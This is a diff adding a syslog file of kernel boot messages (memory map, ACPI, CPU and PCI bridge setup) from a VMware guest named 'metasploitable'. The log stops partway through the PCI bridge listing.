@@ -1,0 +1,974 @@
+Sep  2 16:27:54 metasploitable syslogd 1.5.0#1ubuntu1: restart.
+Sep  2 16:27:54 metasploitable kernel: Inspecting /boot/System.map-2.6.24-16-server
+Sep  2 16:27:54 metasploitable kernel: Loaded 28738 symbols from /boot/System.map-2.6.24-16-server.
+Sep  2 16:27:54 metasploitable kernel: Symbols match kernel version 2.6.24.
+Sep  2 16:27:54 metasploitable kernel: Loaded 15781 symbols from 60 modules.
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] Initializing cgroup subsys cpuset
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] Initializing cgroup subsys cpu
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] Linux version 2.6.24-16-server (buildd@palmer) (gcc version 4.2.3 (Ubuntu 4.2.3-2ubuntu7)) #1 SMP Thu Apr 10 13:58:00 UTC 2008 (Ubuntu 2.6.24-16.30-server)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] BIOS-provided physical RAM map:
+Sep  2 16:27:54 metasploitable kernel: [    0.000000]  BIOS-e820: 0000000000000000 - 000000000009f800 (usable)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000]  BIOS-e820: 000000000009f800 - 00000000000a0000 (reserved)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000]  BIOS-e820: 00000000000dc000 - 0000000000100000 (reserved)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000]  BIOS-e820: 0000000000100000 - 0000000044ae0000 (usable)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000]  BIOS-e820: 0000000044ae0000 - 0000000044aff000 (ACPI data)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000]  BIOS-e820: 0000000044aff000 - 0000000044b00000 (ACPI NVS)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000]  BIOS-e820: 0000000044b00000 - 0000000044c00000 (usable)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000]  BIOS-e820: 00000000e0000000 - 00000000e8000000 (reserved)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000]  BIOS-e820: 00000000fec00000 - 00000000fec10000 (reserved)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000]  BIOS-e820: 00000000fee00000 - 00000000fee01000 (reserved)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000]  BIOS-e820: 00000000fffe0000 - 0000000100000000 (reserved)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] 204MB HIGHMEM available.
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] 896MB LOWMEM available.
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] found SMP MP-table at 000f6a70
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] NX (Execute Disable) protection: active
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] Zone PFN ranges:
+Sep  2 16:27:54 metasploitable kernel: [    0.000000]   DMA             0 ->     4096
+Sep  2 16:27:54 metasploitable kernel: [    0.000000]   Normal       4096 ->   229376
+Sep  2 16:27:54 metasploitable kernel: [    0.000000]   HighMem    229376 ->   281600
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] Movable zone start PFN for each node
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] early_node_map[1] active PFN ranges
+Sep  2 16:27:54 metasploitable kernel: [    0.000000]     0:        0 ->   281600
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] DMI present.
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: RSDP signature @ 0xC00F6A00 checksum 0
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: RSDP 000F6A00, 0024 (r2 PTLTD )
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: XSDT 44AEEA7B, 0054 (r1 INTEL  440BX     6040000 VMW   1324272)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: FACP 44AFEE73, 00F4 (r4 INTEL  440BX     6040000 PTL     F4240)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: DSDT 44AEEC95, 101DE (r1 PTLTD  Custom    6040000 MSFT  3000001)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: FACS 44AFFFC0, 0040
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: BOOT 44AEEC6D, 0028 (r1 PTLTD  $SBFTBL$  6040000  LTP        1)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: APIC 44AEEC0F, 005E (r1 PTLTD  ^I APIC    6040000  LTP        0)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: MCFG 44AEEBD3, 003C (r1 PTLTD  $PCITBL$  6040000  LTP        1)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: SRAT 44AEEB33, 00A0 (r2 VMWARE MEMPLUG   6040000 VMW         1)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: WAET 44AEEB0B, 0028 (r1 VMWARE VMW WAET  6040000 VMW         1)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: PM-Timer IO Port: 0x1008
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: LAPIC (acpi_id[0x00] lapic_id[0x00] enabled)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] Processor #0 14:14 APIC version 17
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: LAPIC (acpi_id[0x01] lapic_id[0x01] enabled)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] Processor #1 14:14 APIC version 17
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: LAPIC_NMI (acpi_id[0x00] high edge lint[0x1])
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: LAPIC_NMI (acpi_id[0x01] high edge lint[0x1])
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: IOAPIC (id[0x02] address[0xfec00000] gsi_base[0])
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] IOAPIC[0]: apic_id 2, version 17, address 0xfec00000, GSI 0-23
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 high edge)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] Enabling APIC mode:  Flat.  Using 1 I/O APICs
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] Using ACPI (MADT) for SMP configuration information
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] Allocating PCI resources starting at 50000000 (gap: 44c00000:9b400000)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] swsusp: Registered nosave memory region: 000000000009f000 - 00000000000a0000
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] swsusp: Registered nosave memory region: 00000000000a0000 - 00000000000dc000
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] swsusp: Registered nosave memory region: 00000000000dc000 - 0000000000100000
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 279400
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] Kernel command line: root=/dev/mapper/metasploitable-root ro quiet splash
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] Enabling fast FPU save and restore... done.
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] Enabling unmasked SIMD FPU exception support... done.
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] Initializing CPU#0
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] PID hash table entries: 4096 (order: 12, 16384 bytes)
+Sep  2 16:27:54 metasploitable kernel: [    0.000000] Detected 2112.781 MHz processor.
+Sep  2 16:27:54 metasploitable kernel: [    9.657312] Console: colour VGA+ 80x25
+Sep  2 16:27:54 metasploitable kernel: [    9.657332] console [tty0] enabled
+Sep  2 16:27:54 metasploitable kernel: [    9.658188] Dentry cache hash table entries: 131072 (order: 7, 524288 bytes)
+Sep  2 16:27:54 metasploitable kernel: [    9.659045] Inode-cache hash table entries: 65536 (order: 6, 262144 bytes)
+Sep  2 16:27:54 metasploitable kernel: [    9.666066] Memory: 1103784k/1126400k available (2255k kernel code, 21676k reserved, 1032k data, 384k init, 208768k highmem)
+Sep  2 16:27:54 metasploitable kernel: [    9.666093] virtual kernel memory layout:
+Sep  2 16:27:54 metasploitable kernel: [    9.666105]     fixmap  : 0xfff4c000 - 0xfffff000   ( 716 kB)
+Sep  2 16:27:54 metasploitable kernel: [    9.666116]     pkmap   : 0xffc00000 - 0xffe00000   (2048 kB)
+Sep  2 16:27:54 metasploitable kernel: [    9.666127]     vmalloc : 0xf8800000 - 0xffbfe000   ( 115 MB)
+Sep  2 16:27:54 metasploitable kernel: [    9.666137]     lowmem  : 0xc0000000 - 0xf8000000   ( 896 MB)
+Sep  2 16:27:54 metasploitable kernel: [    9.666148]       .init : 0xc043c000 - 0xc049c000   ( 384 kB)
+Sep  2 16:27:54 metasploitable kernel: [    9.666159]       .data : 0xc0333e95 - 0xc0435fe4   (1032 kB)
+Sep  2 16:27:54 metasploitable kernel: [    9.666170]       .text : 0xc0100000 - 0xc0333e95   (2255 kB)
+Sep  2 16:27:54 metasploitable kernel: [    9.666182] Checking if this processor honours the WP bit even in supervisor mode... Ok.
+Sep  2 16:27:54 metasploitable kernel: [    9.666346] SLUB: Genslabs=11, HWalign=64, Order=0-1, MinObjects=4, CPUs=2, Nodes=1
+Sep  2 16:27:54 metasploitable kernel: [    9.816300] Calibrating delay using timer specific routine.. 4302.41 BogoMIPS (lpj=21512089)
+Sep  2 16:27:54 metasploitable kernel: [    9.816419] Security Framework initialized
+Sep  2 16:27:54 metasploitable kernel: [    9.816430] SELinux:  Disabled at boot.
+Sep  2 16:27:54 metasploitable kernel: [    9.816487] AppArmor: AppArmor initialized
+Sep  2 16:27:54 metasploitable kernel: [    9.816499] Failure registering capabilities with primary security module.
+Sep  2 16:27:54 metasploitable kernel: [    9.816512] Mount-cache hash table entries: 512
+Sep  2 16:27:54 metasploitable kernel: [    9.816668] Initializing cgroup subsys ns
+Sep  2 16:27:54 metasploitable kernel: [    9.816683] Initializing cgroup subsys cpuacct
+Sep  2 16:27:54 metasploitable kernel: [    9.816979] CPU: L1 I cache: 32K, L1 D cache: 32K
+Sep  2 16:27:54 metasploitable kernel: [    9.816991] CPU: L2 cache: 256K
+Sep  2 16:27:54 metasploitable kernel: [    9.817002] CPU: L3 cache: 8192K
+Sep  2 16:27:54 metasploitable kernel: [    9.817112] Compat vDSO mapped to ffffe000.
+Sep  2 16:27:54 metasploitable kernel: [    9.817172] Checking 'hlt' instruction... OK.
+Sep  2 16:27:54 metasploitable kernel: [    9.856346] SMP alternatives: switching to UP code
+Sep  2 16:27:54 metasploitable kernel: [    9.896321] Early unpacking initramfs... done
+Sep  2 16:27:54 metasploitable kernel: [   10.215765] ACPI: Core revision 20070126
+Sep  2 16:27:54 metasploitable kernel: [   10.215921] ACPI: Looking for DSDT in initramfs... error, file /DSDT.aml not found.
+Sep  2 16:27:54 metasploitable kernel: [   10.216360] CPU0: Intel(R) Core(TM) i7-8650U CPU @ 1.90GHz stepping 0a
+Sep  2 16:27:54 metasploitable kernel: [   10.216529] SMP alternatives: switching to SMP code
+Sep  2 16:27:54 metasploitable kernel: [   10.245601] Booting processor 1/1 eip 3000
+Sep  2 16:27:54 metasploitable kernel: [   10.256485] Initializing CPU#1
+Sep  2 16:27:54 metasploitable kernel: [   10.405269] Calibrating delay using timer specific routine.. 4248.28 BogoMIPS (lpj=21241416)
+Sep  2 16:27:54 metasploitable kernel: [   10.405506] CPU: L1 I cache: 32K, L1 D cache: 32K
+Sep  2 16:27:54 metasploitable kernel: [   10.405516] CPU: L2 cache: 256K
+Sep  2 16:27:54 metasploitable kernel: [   10.405525] CPU: L3 cache: 8192K
+Sep  2 16:27:54 metasploitable kernel: [   10.405636] CPU1: Intel(R) Core(TM) i7-8650U CPU @ 1.90GHz stepping 0a
+Sep  2 16:27:54 metasploitable kernel: [   10.405792] Total of 2 processors activated (8550.70 BogoMIPS).
+Sep  2 16:27:54 metasploitable kernel: [   10.405948] ENABLING IO-APIC IRQs
+Sep  2 16:27:54 metasploitable kernel: [   10.406261] ..TIMER: vector=0x31 apic1=0 pin1=2 apic2=-1 pin2=-1
+Sep  2 16:27:54 metasploitable kernel: [   10.626595] checking TSC synchronization [CPU#0 -> CPU#1]: passed.
+Sep  2 16:27:54 metasploitable kernel: [   10.646732] Brought up 2 CPUs
+Sep  2 16:27:54 metasploitable kernel: [   10.648060] net_namespace: 64 bytes
+Sep  2 16:27:54 metasploitable kernel: [   10.648076] Booting paravirtualized kernel on bare hardware
+Sep  2 16:27:54 metasploitable kernel: [   10.648881] Time: 20:27:11  Date: 09/02/26
+Sep  2 16:27:54 metasploitable kernel: [   10.648938] NET: Registered protocol family 16
+Sep  2 16:27:54 metasploitable kernel: [   10.650172] EISA bus registered
+Sep  2 16:27:54 metasploitable kernel: [   10.650185] ACPI: bus type pci registered
+Sep  2 16:27:54 metasploitable kernel: [   10.650720] PCI: PCI BIOS revision 2.10 entry at 0xfd8a0, last bus=34
+Sep  2 16:27:54 metasploitable kernel: [   10.650731] PCI: Using configuration type 1
+Sep  2 16:27:54 metasploitable kernel: [   10.650742] Setting up standard PCI resources
+Sep  2 16:27:54 metasploitable kernel: [   10.658313] ACPI: BIOS _OSI(Linux) query ignored
+Sep  2 16:27:54 metasploitable kernel: [   10.658330] ACPI: DMI System Vendor: VMware, Inc.
+Sep  2 16:27:54 metasploitable kernel: [   10.658340] ACPI: DMI Product Name: VMware Virtual Platform
+Sep  2 16:27:54 metasploitable kernel: [   10.658350] ACPI: DMI Product Version: None
+Sep  2 16:27:54 metasploitable kernel: [   10.658360] ACPI: DMI Board Name: 440BX Desktop Reference Platform
+Sep  2 16:27:54 metasploitable kernel: [   10.658370] ACPI: DMI BIOS Vendor: Phoenix Technologies LTD
+Sep  2 16:27:54 metasploitable kernel: [   10.658380] ACPI: DMI BIOS Date: 11/12/2020
+Sep  2 16:27:54 metasploitable kernel: [   10.658389] ACPI: Please send DMI info above to linux-acpi@vger.kernel.org
+Sep  2 16:27:54 metasploitable kernel: [   10.658399] ACPI: If "acpi_osi=Linux" works better, please notify linux-acpi@vger.kernel.org
+Sep  2 16:27:54 metasploitable kernel: [   10.658603] ACPI: Interpreter enabled
+Sep  2 16:27:54 metasploitable kernel: [   10.658619] ACPI: (supports S0 S1 S4 S5)
+Sep  2 16:27:54 metasploitable kernel: [   10.658635] ACPI: Using IOAPIC for interrupt routing
+Sep  2 16:27:54 metasploitable kernel: [   10.666490] ACPI: PCI Root Bridge [PCI0] (0000:00)
+Sep  2 16:27:54 metasploitable kernel: [   10.666830] PCI quirk: region 1000-103f claimed by PIIX4 ACPI
+Sep  2 16:27:54 metasploitable kernel: [   10.666872] PCI quirk: region 1040-104f claimed by PIIX4 SMB
+Sep  2 16:27:54 metasploitable kernel: [   10.669117] PCI: Transparent bridge - 0000:00:11.0
+Sep  2 16:27:54 metasploitable kernel: [   10.683182] ACPI: PCI Interrupt Link [LNKA] (IRQs 3 4 5 6 7 *9 10 11 14 15)
+Sep  2 16:27:54 metasploitable kernel: [   10.683186] ACPI: PCI Interrupt Link [LNKB] (IRQs 3 4 5 6 7 9 10 *11 14 15)
+Sep  2 16:27:54 metasploitable kernel: [   10.683191] ACPI: PCI Interrupt Link [LNKC] (IRQs 3 4 5 6 7 9 *10 11 14 15)
+Sep  2 16:27:54 metasploitable kernel: [   10.683196] ACPI: PCI Interrupt Link [LNKD] (IRQs 3 4 *5 6 7 9 10 11 14 15)
+Sep  2 16:27:54 metasploitable kernel: [   10.683295] Linux Plug and Play Support v0.97 (c) Adam Belay
+Sep  2 16:27:54 metasploitable kernel: [   10.683347] pnp: PnP ACPI init
+Sep  2 16:27:54 metasploitable kernel: [   10.683352] ACPI: bus type pnp registered
+Sep  2 16:27:54 metasploitable kernel: [   10.684056] pnp: PnP ACPI: found 13 devices
+Sep  2 16:27:54 metasploitable kernel: [   10.684061] ACPI: ACPI bus type pnp unregistered
+Sep  2 16:27:54 metasploitable kernel: [   10.684066] PnPBIOS: Disabled by ACPI PNP
+Sep  2 16:27:54 metasploitable kernel: [   10.684496] PCI: Using ACPI for IRQ routing
+Sep  2 16:27:54 metasploitable kernel: [   10.684500] PCI: If a device doesn't work, try "pci=routeirq".  If it helps, post a report
+Sep  2 16:27:54 metasploitable kernel: [   10.685342] Clocksource tsc unstable (delta = -497626604 ns)
+Sep  2 16:27:54 metasploitable kernel: [   10.685692] NET: Registered protocol family 8
+Sep  2 16:27:54 metasploitable kernel: [   10.685696] NET: Registered protocol family 20
+Sep  2 16:27:54 metasploitable kernel: [   10.685748] NetLabel: Initializing
+Sep  2 16:27:54 metasploitable kernel: [   10.685753] NetLabel:  domain hash size = 128
+Sep  2 16:27:54 metasploitable kernel: [   10.685758] NetLabel:  protocols = UNLABELED CIPSOv4
+Sep  2 16:27:54 metasploitable kernel: [   10.685762] NetLabel:  unlabeled traffic allowed by default
+Sep  2 16:27:54 metasploitable kernel: [   10.685767] AppArmor: AppArmor Filesystem Enabled
+Sep  2 16:27:54 metasploitable kernel: [   10.685890] system 00:01: ioport range 0x1000-0x103f has been reserved
+Sep  2 16:27:54 metasploitable kernel: [   10.685895] system 00:01: ioport range 0x1040-0x104f has been reserved
+Sep  2 16:27:54 metasploitable kernel: [   10.685900] system 00:01: ioport range 0xcf0-0xcf1 has been reserved
+Sep  2 16:27:54 metasploitable kernel: [   10.685904] system 00:0c: ioport range 0xfce0-0xfcff has been reserved
+Sep  2 16:27:54 metasploitable kernel: [   10.685909] system 00:0c: iomem range 0xe0000000-0xe7ffffff could not be reserved
+Sep  2 16:27:54 metasploitable kernel: [   10.685914] system 00:0c: iomem range 0xfe800000-0xfe9fffff has been reserved
+Sep  2 16:27:54 metasploitable kernel: [   10.716474] PCI: Bridge: 0000:00:01.0
+Sep  2 16:27:54 metasploitable kernel: [   10.716479]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716484]   MEM window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716489]   PREFETCH window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716493] PCI: Bridge: 0000:00:11.0
+Sep  2 16:27:54 metasploitable kernel: [   10.716498]   IO window: 2000-3fff
+Sep  2 16:27:54 metasploitable kernel: [   10.716503]   MEM window: ef500000-efffffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716508]   PREFETCH window: dfb00000-dfffffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716512] PCI: Bridge: 0000:00:15.0
+Sep  2 16:27:54 metasploitable kernel: [   10.716517]   IO window: 4000-4fff
+Sep  2 16:27:54 metasploitable kernel: [   10.716522]   MEM window: ef400000-ef4fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716526]   PREFETCH window: dfa00000-dfafffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716531] PCI: Bridge: 0000:00:15.1
+Sep  2 16:27:54 metasploitable kernel: [   10.716536]   IO window: 8000-8fff
+Sep  2 16:27:54 metasploitable kernel: [   10.716541]   MEM window: ef000000-ef0fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716545]   PREFETCH window: df600000-df6fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716550] PCI: Bridge: 0000:00:15.2
+Sep  2 16:27:54 metasploitable kernel: [   10.716555]   IO window: c000-cfff
+Sep  2 16:27:54 metasploitable kernel: [   10.716560]   MEM window: eec00000-eecfffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716564]   PREFETCH window: df200000-df2fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716569] PCI: Bridge: 0000:00:15.3
+Sep  2 16:27:54 metasploitable kernel: [   10.716574]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716578]   MEM window: ee800000-ee8fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716583]   PREFETCH window: dee00000-deefffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716588] PCI: Bridge: 0000:00:15.4
+Sep  2 16:27:54 metasploitable kernel: [   10.716593]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716597]   MEM window: ee400000-ee4fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716602]   PREFETCH window: dea00000-deafffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716607] PCI: Bridge: 0000:00:15.5
+Sep  2 16:27:54 metasploitable kernel: [   10.716612]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716616]   MEM window: ee000000-ee0fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716621]   PREFETCH window: de600000-de6fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716626] PCI: Bridge: 0000:00:15.6
+Sep  2 16:27:54 metasploitable kernel: [   10.716630]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716635]   MEM window: edc00000-edcfffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716640]   PREFETCH window: de200000-de2fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716645] PCI: Bridge: 0000:00:15.7
+Sep  2 16:27:54 metasploitable kernel: [   10.716649]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716654]   MEM window: ed800000-ed8fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716659]   PREFETCH window: dde00000-ddefffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716664] PCI: Bridge: 0000:00:16.0
+Sep  2 16:27:54 metasploitable kernel: [   10.716668]   IO window: 5000-5fff
+Sep  2 16:27:54 metasploitable kernel: [   10.716673]   MEM window: ef300000-ef3fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716678]   PREFETCH window: df900000-df9fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716682] PCI: Bridge: 0000:00:16.1
+Sep  2 16:27:54 metasploitable kernel: [   10.716687]   IO window: 9000-9fff
+Sep  2 16:27:54 metasploitable kernel: [   10.716692]   MEM window: eef00000-eeffffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716697]   PREFETCH window: df500000-df5fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716701] PCI: Bridge: 0000:00:16.2
+Sep  2 16:27:54 metasploitable kernel: [   10.716706]   IO window: d000-dfff
+Sep  2 16:27:54 metasploitable kernel: [   10.716711]   MEM window: eeb00000-eebfffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716716]   PREFETCH window: df100000-df1fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716720] PCI: Bridge: 0000:00:16.3
+Sep  2 16:27:54 metasploitable kernel: [   10.716725]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716730]   MEM window: ee700000-ee7fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716734]   PREFETCH window: ded00000-dedfffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716739] PCI: Bridge: 0000:00:16.4
+Sep  2 16:27:54 metasploitable kernel: [   10.716744]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716749]   MEM window: ee300000-ee3fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716753]   PREFETCH window: de900000-de9fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716758] PCI: Bridge: 0000:00:16.5
+Sep  2 16:27:54 metasploitable kernel: [   10.716763]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716768]   MEM window: edf00000-edffffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716772]   PREFETCH window: de500000-de5fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716777] PCI: Bridge: 0000:00:16.6
+Sep  2 16:27:54 metasploitable kernel: [   10.716782]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716786]   MEM window: edb00000-edbfffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716791]   PREFETCH window: de100000-de1fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716796] PCI: Bridge: 0000:00:16.7
+Sep  2 16:27:54 metasploitable kernel: [   10.716801]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716805]   MEM window: ed700000-ed7fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716810]   PREFETCH window: ddd00000-dddfffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716815] PCI: Bridge: 0000:00:17.0
+Sep  2 16:27:54 metasploitable kernel: [   10.716820]   IO window: 6000-6fff
+Sep  2 16:27:54 metasploitable kernel: [   10.716824]   MEM window: ef200000-ef2fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716829]   PREFETCH window: df800000-df8fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716834] PCI: Bridge: 0000:00:17.1
+Sep  2 16:27:54 metasploitable kernel: [   10.716838]   IO window: a000-afff
+Sep  2 16:27:54 metasploitable kernel: [   10.716843]   MEM window: eee00000-eeefffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716848]   PREFETCH window: df400000-df4fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716853] PCI: Bridge: 0000:00:17.2
+Sep  2 16:27:54 metasploitable kernel: [   10.716857]   IO window: e000-efff
+Sep  2 16:27:54 metasploitable kernel: [   10.716862]   MEM window: eea00000-eeafffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716867]   PREFETCH window: df000000-df0fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716872] PCI: Bridge: 0000:00:17.3
+Sep  2 16:27:54 metasploitable kernel: [   10.716876]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716881]   MEM window: ee600000-ee6fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716886]   PREFETCH window: dec00000-decfffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716890] PCI: Bridge: 0000:00:17.4
+Sep  2 16:27:54 metasploitable kernel: [   10.716895]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716900]   MEM window: ee200000-ee2fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716905]   PREFETCH window: de800000-de8fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716909] PCI: Bridge: 0000:00:17.5
+Sep  2 16:27:54 metasploitable kernel: [   10.716914]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716919]   MEM window: ede00000-edefffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716924]   PREFETCH window: de400000-de4fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716928] PCI: Bridge: 0000:00:17.6
+Sep  2 16:27:54 metasploitable kernel: [   10.716933]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716938]   MEM window: eda00000-edafffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716942]   PREFETCH window: de000000-de0fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.716952] Time: acpi_pm clocksource has been installed.
+Sep  2 16:27:54 metasploitable kernel: [   10.716990] PCI: Bridge: 0000:00:17.7
+Sep  2 16:27:54 metasploitable kernel: [   10.716994]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.716999]   MEM window: ed600000-ed6fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717004]   PREFETCH window: ddc00000-ddcfffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717009] PCI: Bridge: 0000:00:18.0
+Sep  2 16:27:54 metasploitable kernel: [   10.717013]   IO window: 7000-7fff
+Sep  2 16:27:54 metasploitable kernel: [   10.717018]   MEM window: ef100000-ef1fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717023]   PREFETCH window: df700000-df7fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717028] PCI: Bridge: 0000:00:18.1
+Sep  2 16:27:54 metasploitable kernel: [   10.717032]   IO window: b000-bfff
+Sep  2 16:27:54 metasploitable kernel: [   10.717037]   MEM window: eed00000-eedfffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717042]   PREFETCH window: df300000-df3fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717046] PCI: Bridge: 0000:00:18.2
+Sep  2 16:27:54 metasploitable kernel: [   10.717051]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.717056]   MEM window: ee900000-ee9fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717061]   PREFETCH window: def00000-deffffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717065] PCI: Bridge: 0000:00:18.3
+Sep  2 16:27:54 metasploitable kernel: [   10.717070]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.717075]   MEM window: ee500000-ee5fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717080]   PREFETCH window: deb00000-debfffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717084] PCI: Bridge: 0000:00:18.4
+Sep  2 16:27:54 metasploitable kernel: [   10.717089]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.717094]   MEM window: ee100000-ee1fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717098]   PREFETCH window: de700000-de7fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717103] PCI: Bridge: 0000:00:18.5
+Sep  2 16:27:54 metasploitable kernel: [   10.717108]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.717113]   MEM window: edd00000-eddfffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717117]   PREFETCH window: de300000-de3fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717122] PCI: Bridge: 0000:00:18.6
+Sep  2 16:27:54 metasploitable kernel: [   10.717127]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.717132]   MEM window: ed900000-ed9fffff
